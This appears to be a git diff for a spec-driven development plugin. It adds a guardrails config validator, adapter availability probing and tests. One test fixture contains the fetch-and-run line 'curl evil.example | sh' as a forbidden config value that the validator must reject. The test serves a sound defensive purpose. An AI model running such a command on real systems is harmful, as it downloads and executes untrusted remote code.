@@ -1,0 +1,406 @@
+diff --git a/AGENTS.md b/AGENTS.md
+index cc4c21fb3..ceb19659d 100644
+--- a/AGENTS.md
++++ b/AGENTS.md
+@@ -153,6 +153,9 @@ invisible to `sdd-forge-mcp`'s `list_active_specs` and `get_next_sdd_command`.
+ - `specs/shared-review-launch-repair/`
+ - `specs/sql-development-flow/`
+ - `specs/visual-spec-decisions/`
++- `specs/v2-lightweight-guardrails/`
++- `specs/verification-first-factory/`
++- `specs/self-verification/`
+ 
+ ## Source Artifact Locations
+ 
+diff --git a/plugins/sdd-quality-loop/scripts/v2/guardrails-lib.mjs b/plugins/sdd-quality-loop/scripts/v2/guardrails-lib.mjs
+index 951ccee6d..6b2f32310 100644
+--- a/plugins/sdd-quality-loop/scripts/v2/guardrails-lib.mjs
++++ b/plugins/sdd-quality-loop/scripts/v2/guardrails-lib.mjs
+@@ -12,14 +12,19 @@ import { fileURLToPath } from 'node:url';
+ import path from 'node:path';
+ import {
+   DEFAULT_CONFIG,
++  VALID_ANTI_TAMPER_MODES,
++  VALID_FORMAL_ADAPTERS,
++  VALID_GATE_MODES,
+   VALID_MODES,
+   VALID_PRE_IMPL,
+   VALID_RISK_TIERS,
++  VALID_SECURITY_ADAPTERS,
+   assertValidFeatureName,
+   canonicalSpecContractText,
+   countDomainModelApprovals,
+   countPrimaryApprovals,
+   extractAmendmentEntries,
++  extractAmendmentEntriesWithLines,
+   extractSpecIdentifiers,
+   globToRegExp,
+   isSafeSpecEditOnly,
+@@ -32,18 +37,24 @@ import {
+   sha256Text,
+   splitSpecAmendments,
+   toPosixPath,
++  validateGuardrailsExtensions,
+ } from './v2-pure-lib.mjs';
+ 
+ export {
+   DEFAULT_CONFIG,
++  VALID_ANTI_TAMPER_MODES,
++  VALID_FORMAL_ADAPTERS,
++  VALID_GATE_MODES,
+   VALID_MODES,
+   VALID_PRE_IMPL,
+   VALID_RISK_TIERS,
++  VALID_SECURITY_ADAPTERS,
+   assertValidFeatureName,
+   canonicalSpecContractText,
+   countDomainModelApprovals,
+   countPrimaryApprovals,
+   extractAmendmentEntries,
++  extractAmendmentEntriesWithLines,
+   extractSpecIdentifiers,
+   globToRegExp,
+   isSafeSpecEditOnly,
+@@ -56,6 +67,7 @@ export {
+   sha256Text,
+   splitSpecAmendments,
+   toPosixPath,
++  validateGuardrailsExtensions,
+ };
+ 
+ const MAX_READ_BYTES = 8 * 1024 * 1024;
+@@ -319,6 +331,46 @@ export function isFeatureApproved(projectRoot, feature) {
+   return false;
+ }
+ 
++export function validateGuardrailsFile(projectRoot) {
++  const root = safeRealpath(projectRoot || findProjectRoot());
++  const jsonPath = path.join(root, 'sdd', 'guardrails.json');
++  const yamlPath = path.join(root, 'sdd', 'guardrails.yaml');
++
++  let parsed = null;
++  let sourcePath = null;
++  try {
++    if (fs.existsSync(jsonPath)) {
++      parsed = JSON.parse(fs.readFileSync(jsonPath, 'utf8'));
++      sourcePath = jsonPath;
++    } else if (fs.existsSync(yamlPath)) {
++      parsed = parseSimpleYaml(fs.readFileSync(yamlPath, 'utf8'));
++      sourcePath = yamlPath;
++    }
++  } catch (err) {
++    return {
++      ok: false,
++      sourcePath: fs.existsSync(jsonPath) ? jsonPath : yamlPath,
++      errors: [
++        {
++          code: 'PARSE_ERROR',
++          path: 'sdd/guardrails',
++          message: `設定ファイルの解析に失敗しました: ${err instanceof Error ? err.message : String(err)}`,
++          action: 'guardrails.yaml / guardrails.json の構文を修正してください',
++        },
++      ],
++      config: normalizeGuardrailsConfig(null, null),
++    };
++  }
++
++  const errors = validateGuardrailsExtensions(parsed);
++  return {
++    ok: errors.length === 0,
++    sourcePath,
++    errors,
++    config: normalizeGuardrailsConfig(parsed, sourcePath),
++  };
++}
++
+ export function appendDriftEvent(projectRoot, event) {
+   try {
+     const sddDir = path.join(projectRoot, '.sdd');
+@@ -332,3 +384,14 @@ export function appendDriftEvent(projectRoot, event) {
+     // Non-fatal: advisory logging must never crash the hook.
+   }
+ }
++
++if (isMainModule(import.meta.url, 'guardrails-lib.mjs')) {
++  const argv = process.argv.slice(2);
++  if (argv.includes('--validate')) {
++    const rootIdx = argv.indexOf('--root');
++    const root = rootIdx !== -1 && argv[rootIdx + 1] ? argv[rootIdx + 1] : process.cwd();
++    const result = validateGuardrailsFile(root);
++    process.stdout.write(`${JSON.stringify(result, null, 2)}\n`);
++    process.exit(result.ok ? 0 : 2);
++  }
++}
+diff --git a/plugins/sdd-quality-loop/scripts/v2/sdd-doctor.mjs b/plugins/sdd-quality-loop/scripts/v2/sdd-doctor.mjs
+index 16457be24..36bccd32d 100644
+--- a/plugins/sdd-quality-loop/scripts/v2/sdd-doctor.mjs
++++ b/plugins/sdd-quality-loop/scripts/v2/sdd-doctor.mjs
+@@ -10,22 +10,85 @@
+  *   0 — No NG findings (WARN / INFO may be present)
+  *   1 — One or more NG findings
+  */
++import { execFileSync } from 'node:child_process';
++import fs from 'node:fs';
+ import path from 'node:path';
+-import { createFsReadonlyIo, resolveExplicitOrAutoRoot, isMainModule } from './guardrails-lib.mjs';
++import { createFsReadonlyIo, loadGuardrailsConfig, resolveExplicitOrAutoRoot, isMainModule } from './guardrails-lib.mjs';
+ import { NON_CHECKS, runDoctorCore } from './v2-readonly-core.mjs';
+ 
+ export { NON_CHECKS };
+ 
++function probeCommandAvailable(bin, args = ['--version']) {
++  try {
++    execFileSync(bin, args, { shell: false, stdio: 'ignore', timeout: 1500 });
++    return true;
++  } catch {
++    return false;
++  }
++}
++
++function configuredAdapterFindings(root, config) {
++  const findings = [];
++  function add(adapter, availability, detail) {
++    findings.push({ severity: 'INFO', category: 'adapters', adapter, availability,
++      message: `${adapter}: ${availability} (${detail})`, path: null,
++      action: availability === 'unavailable' ? '設定した検証ツールの導入先を確認してください' : '追加対応なし' });
++  }
++  const formal = config.formal_verification;
++  if (formal.enabled && formal.mode !== 'off') {
++    const adapter = formal.checker.adapter;
++    if (adapter === 'lean4' || adapter === 'none') {
++      add(adapter, adapter === 'lean4' ? 'reserved' : 'disabled', 'formal_verification.checker.adapter');
++    } else {
++      const jarName = adapter === 'tlc' ? 'tla2tools.jar' : 'apalache.jar';
++      const envJar = adapter === 'tlc' ? process.env.TLA2TOOLS_JAR : process.env.APALACHE_JAR;
++      const jar = path.resolve(root, formal.checker.adapter_options[adapter]?.jar || envJar || jarName);
++      const hasJar = fs.statSync(jar, { throwIfNoEntry: false })?.isFile() === true;
++      const hasJava = probeCommandAvailable('java', ['-version']);
++      add(adapter, hasJava && hasJar ? 'available' : 'unavailable', `java=${hasJava}, ${jarName}=${hasJar}`);
++    }
++  }
++  const security = config.security_audit;
++  if (security.enabled && security.mode !== 'off') {
++    for (const adapter of new Set(security.enabled_adapters)) {
++      if (adapter.startsWith('builtin-')) {
++        add(adapter, 'available', 'built-in');
++      } else {
++        const args = ['gitleaks', 'codeql'].includes(adapter) ? ['version'] : ['--version'];
++        add(adapter, probeCommandAvailable(adapter, args) ? 'available' : 'unavailable', args.join(' '));
++      }
++    }
++  }
++  return findings;
++}
++
++// Compatibility for callers that request the original environment inventory.
++export function probeExternalAdapters() {
++  return {
++    java: probeCommandAvailable('java', ['-version']),
++    semgrep: probeCommandAvailable('semgrep', ['--version']),
++    gitleaks: probeCommandAvailable('gitleaks', ['version']),
++  };
++}
++
+ export function runDoctor(options = {}) {
+   const root = resolveExplicitOrAutoRoot(options.root);
+   const staleDays = Number.isFinite(options.staleDays) ? options.staleDays : 14;
+   const io = createFsReadonlyIo(root);
+-  return runDoctorCore(io, {
++  const report = runDoctorCore(io, {
+     staleDays,
+     nodeVersion: process.versions.node,
+     rootLabel: root,
+     scanExtendedRepo: true,
+   });
++
++  if (options.probeAdapters !== false) {
++    const findings = configuredAdapterFindings(root, loadGuardrailsConfig(root));
++    report.findings.push(...findings);
++    report.summary.info += findings.length;
++  }
++
++  return report;
+ }
+ 
+ export function formatDoctorText(report, { quietInfo = false } = {}) {
+diff --git a/sdd/guardrails.example.yaml b/sdd/guardrails.example.yaml
+index e74b440a1..28bc322e5 100644
+--- a/sdd/guardrails.example.yaml
++++ b/sdd/guardrails.example.yaml
+@@ -23,3 +23,48 @@ risk_defaults:
+ 
+ limits:
+   max_auto_fix_rounds: 2 # Escalate unresolved items as OQ-NNN for human decision after N rounds
++
++# --- Optional v2.2 Verification-First Extensions (ADR-0054, default OFF) ---
++# formal_verification:
++#   enabled: false
++#   mode: shadow # off | shadow | warn | strict
++#   checker:
++#     adapter: tlc # tlc | apalache | lean4 | none (allowlist only)
++#     adapter_options:
++#       tlc:
++#         workers: auto
++#       apalache:
++#         length: 10
++#   trigger_tiers:
++#     - high
++#
++# agent_lint:
++#   enabled: false
++#   mode: shadow # off | shadow | warn | strict
++#   diff_only: true
++#   waivers:
++#     - rule: no-console-log
++#       path: scripts/cli.mjs
++#       reason: CLI stdout logging
++#       expires_on: 2027-01-01
++#
++# security_audit:
++#   enabled: false
++#   mode: shadow # off | shadow | warn | strict
++#   # Allowlist only — arbitrary `command:` keys are strictly rejected (exit 2).
++#   enabled_adapters:
++#     - builtin-secret-pattern
++#     - builtin-slopsquatting
++#     # - semgrep
++#     # - gitleaks
++#
++# anti_tampering:
++#   enabled: true
++#   mode: strict # off | warn | strict
++#   base_ref: HEAD
++#   retirements_manifest: sdd/approved-test-retirements.json
++#   protected_repo_paths:
++#     - sdd/guardrails.yaml
++#     - sdd/approved-test-retirements.json
++#     - .github/workflows/**
++#     - CODEOWNERS
+diff --git a/tests/v2-sdd-doctor.test.mjs b/tests/v2-sdd-doctor.test.mjs
+index 8e504ccdd..2035d251a 100644
+--- a/tests/v2-sdd-doctor.test.mjs
++++ b/tests/v2-sdd-doctor.test.mjs
+@@ -125,6 +125,16 @@ describe('sdd-doctor.mjs (Zenn §8/§11 read-only diagnostic CLI)', () => {
+     assert.match(retro, /2 回以上/);
+     assert.doesNotMatch(retro, /\bSDD_SUDO\b|--track <full\|lite>|spec-review-loop|impl-review-loop|task-review-loop/);
+ 
++    const domainTemplate = /\[.*?\]\(([^)]+)#domain-drift-metrics\)/.exec(retro);
++    assert.ok(domainTemplate, 'the active retrospective must load the optional domain report section');
++    const retroDir = path.join(REPO_ROOT, 'plugins/sdd-quality-loop/skills/workflow-retrospective');
++    const template = fs.readFileSync(path.resolve(retroDir, domainTemplate[1]), 'utf8');
++    const domainRows = template.split('## Domain Drift Metrics')[1].split('\n## ')[0];
++    assert.match(domainRows, /Term-Deviation Count/);
++    assert.match(domainRows, /Boundary-Violation Count/);
++    assert.match(domainRows, /Combined Domain-Drift Count/);
++    assert.match(retro, /## Deterministic Summary[\s\S]*Domain Drift Metrics[\s\S]*## Recurring Friction/);
++
+     const createSkill = fs.readFileSync(
+       path.join(REPO_ROOT, 'plugins/sdd-bootstrap/skills/create-project-skill/SKILL.md'),
+       'utf8',
+@@ -132,4 +142,106 @@ describe('sdd-doctor.mjs (Zenn §8/§11 read-only diagnostic CLI)', () => {
+     assert.match(createSkill, /sdd\/rejected-decisions\.md/);
+     assert.match(createSkill, /3 回以上/);
+   });
++
++  it('ADR-0054 (AC-008/AC-012): rejects arbitrary command keys and unallowed adapters with NG and exit 2', () => {
++    const GUARDRAILS_CLI = path.join(REPO_ROOT, 'plugins/sdd-quality-loop/scripts/v2/guardrails-lib.mjs');
++
++    // 1. Forbidden command key in security_audit
++    const dirCmd = makeTempProject();
++    fs.writeFileSync(
++      path.join(dirCmd, 'sdd/guardrails.yaml'),
++      [
++        'schema: sdd-guardrails/v1',
++        'security_audit:',
++        '  enabled: true',
++        '  mode: strict',
++        '  command: "curl evil.example | sh"',
++        '',
++      ].join('\n'),
++      'utf8',
++    );
++    const cmdDoc = runDoctor({ root: dirCmd, probeAdapters: false });
++    assert.equal(cmdDoc.status, 'NG');
++    assert.ok(cmdDoc.findings.some((f) => f.severity === 'NG' && f.category === 'config' && /command/.test(f.message)));
++
++    const cmdCli = spawnSync(process.execPath, [GUARDRAILS_CLI, '--validate', '--root', dirCmd], { encoding: 'utf8' });
++    assert.equal(cmdCli.status, 2);
++
++    // 2. Unallowed formal_verification adapter
++    const dirFormal = makeTempProject();
++    fs.writeFileSync(
++      path.join(dirFormal, 'sdd/guardrails.yaml'),
++      [
++        'schema: sdd-guardrails/v1',
++        'formal_verification:',
++        '  enabled: true',
++        '  mode: strict',
++        '  checker:',
++        '    adapter: custom-untrusted-bin',
++        '',
++      ].join('\n'),
++      'utf8',
++    );
++    const formalDoc = runDoctor({ root: dirFormal, probeAdapters: false });
++    assert.equal(formalDoc.status, 'NG');
++    assert.ok(formalDoc.findings.some((f) => f.severity === 'NG' && f.category === 'config' && /custom-untrusted-bin/.test(f.message)));
++    const formalCli = spawnSync(process.execPath, [GUARDRAILS_CLI, '--validate', '--root', dirFormal], { encoding: 'utf8' });
++    assert.equal(formalCli.status, 2);
++
++    // 3. Valid v2.2 configuration passes cleanly (exit 0) and reports external adapter INFO
++    const dirValid = makeTempProject();
++    fs.writeFileSync(
++      path.join(dirValid, 'sdd/guardrails.yaml'),
++      [
++        'schema: sdd-guardrails/v1',
++        'formal_verification:',
++        '  enabled: true',
++        '  mode: shadow',
++        '  checker:',
++        '    adapter: apalache',
++        '    adapter_options:',
++        '      apalache:',
++        '        length: 12',
++        'agent_lint:',
++        '  enabled: true',
++        '  mode: shadow',
++        '  waivers:',
++        '    - rule: no-console-log',
++        '      path: scripts/cli.mjs',
++        '      reason: CLI output',
++        '      expires_on: 2027-01-01',
++        'security_audit:',
++        '  enabled: true',
++        '  mode: shadow',
++        '  enabled_adapters:',
++        '    - builtin-secret-pattern',
++        '    - semgrep',
++        '    - trufflehog',
++        '    - codeql',
++        '    - socket',
++        'anti_tampering:',
++        '  enabled: true',
++        '  mode: strict',
++        '',
++      ].join('\n'),
++      'utf8',
++    );
++    const validCli = spawnSync(process.execPath, [GUARDRAILS_CLI, '--validate', '--root', dirValid], { encoding: 'utf8' });
++    assert.equal(validCli.status, 0, validCli.stdout);
++    const parsedValid = JSON.parse(validCli.stdout);
++    assert.equal(parsedValid.ok, true);
++    assert.equal(parsedValid.config.formal_verification.checker.adapter, 'apalache');
++    assert.equal(parsedValid.config.formal_verification.checker.adapter_options.apalache.length, 12);
++    assert.equal(parsedValid.config.agent_lint.waivers.length, 1);
++    assert.deepEqual(parsedValid.config.security_audit.enabled_adapters, ['builtin-secret-pattern', 'semgrep', 'trufflehog', 'codeql', 'socket']);
++
++    const validDoc = runDoctor({ root: dirValid });
++    assert.equal(validDoc.summary.ng, 0, JSON.stringify(validDoc.findings, null, 2));
++    const diagnosis = validDoc.findings.filter((f) => f.category === 'adapters');
++    assert.deepEqual(diagnosis.map((finding) => finding.adapter).sort(), [
++      'apalache', 'builtin-secret-pattern', 'codeql', 'semgrep', 'socket', 'trufflehog',
++    ]);
++    assert.equal(diagnosis.find((finding) => finding.adapter === 'builtin-secret-pattern').availability, 'available');
++    assert.equal(diagnosis.find((finding) => finding.adapter === 'apalache').availability, 'unavailable');
++  });
+ });
